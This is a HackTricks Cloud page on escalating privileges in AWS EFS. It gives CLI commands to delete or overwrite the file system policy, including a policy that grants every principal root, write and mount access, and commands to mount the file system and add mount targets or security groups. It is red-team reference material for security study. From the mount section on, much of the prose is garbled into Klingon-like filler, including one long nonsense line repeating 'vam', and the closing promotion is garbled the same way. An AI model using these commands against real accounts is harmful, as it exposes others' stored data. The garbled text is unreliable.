# AWS - EFS Privesc

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## EFS

More **info about EFS** in:

{% content-ref url="../aws-services/aws-efs-enum.md" %}
[aws-efs-enum.md](../aws-services/aws-efs-enum.md)
{% endcontent-ref %}

Remember that in order to mount an EFS you need to be in a subnetwork where the EFS is exposed and have access to it (security groups). Is this is happening, by default, you will always be able to mount it, however, if it's protected by IAM policies you need to have the extra permissions mentioned here to access it.

### `elasticfilesystem:DeleteFileSystemPolicy`|`elasticfilesystem:PutFileSystemPolicy`

With any of those permissions an attacker can **change the file system policy** to **give you access** to it, or to just **delete it** so the **default access** is granted.

To delete the policy:
```bash
aws efs delete-file-system-policy \
--file-system-id <value>
```
To change it:

ghItlh:
```json
aws efs put-file-system-policy --file-system-id <fs-id> --policy file:///tmp/policy.json

// Give everyone trying to mount it read, write and root access
// policy.json:
{
"Version": "2012-10-17",
"Id": "efs-policy-wizard-059944c6-35e7-4ba0-8e40-6f05302d5763",
"Statement": [
{
"Sid": "efs-statement-2161b2bd-7c59-49d7-9fee-6ea8903e6603",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"elasticfilesystem:ClientRootAccess",
"elasticfilesystem:ClientWrite",
"elasticfilesystem:ClientMount"
],
"Condition": {
"Bool": {
"elasticfilesystem:AccessedViaMountTarget": "true"
}
}
}
]
}
```
### `elasticfilesystem:ClientMount|(elasticfilesystem:ClientRootAccess)|(elasticfilesystem:ClientWrite)`

**QI'ya'** permission vItlhutlh **EFS** **mount** vaj. QaH **write permission** pagh **ghaH** 'ej 'oH **read access**.
```bash
sudo mkdir /efs
sudo mount -t efs -o tls,iam  <file-system-id/EFS DNS name>:/ /efs/
```
**QIbDajmo'**: `elasticfilesystem:ClientRootAccess` je `elasticfilesystem:ClientWrite` **yIlo'** **filesystem** **mounted** 'ej **access** **root** **filesystem**.

**Qapla'**: **Indirect privesc** **sensitive information** **filesystem** **lo'laHbe'**.

### `elasticfilesystem:CreateMountTarget`

**Subnetwork** **mount target** **EFS** **exists** **attacker** **create** **subnet** **privilege** **one** **just** **could**:
```bash
# You need to indicate security groups that will grant the user access to port 2049
aws efs create-mount-target --file-system-id <fs-id> \
--subnet-id <value> \
--security-groups <value>
```
**Qa'legh:** Qa'leghvam: Qa'leghvamvam 'ej qa'leghvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvamvam
```bash
aws efs modify-mount-target-security-groups \
--mount-target-id <value> \
--security-groups <value>
```
**Qapla'!** QaD potential: QaD privesc by locating sensitive information in the file system.

<details>

<summary><strong>ghItlh! HackTricks AWS Red Team Expert (htARTE) laH HackTricks</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ghItlh!</strong></a></summary>

HackTricks vItlhutlh:

* QaD **company advertised in HackTricks** vaj **HackTricks in PDF download** lo'laH [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) qar'a'!
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) ghaH **ghItlh**.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) vItlhutlh, **NFTs** (https://opensea.io/collection/the-peass-family) qar'a'!
* üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) vaj [**telegram group**](https://t.me/peass) **join** vaj **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) vaj [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
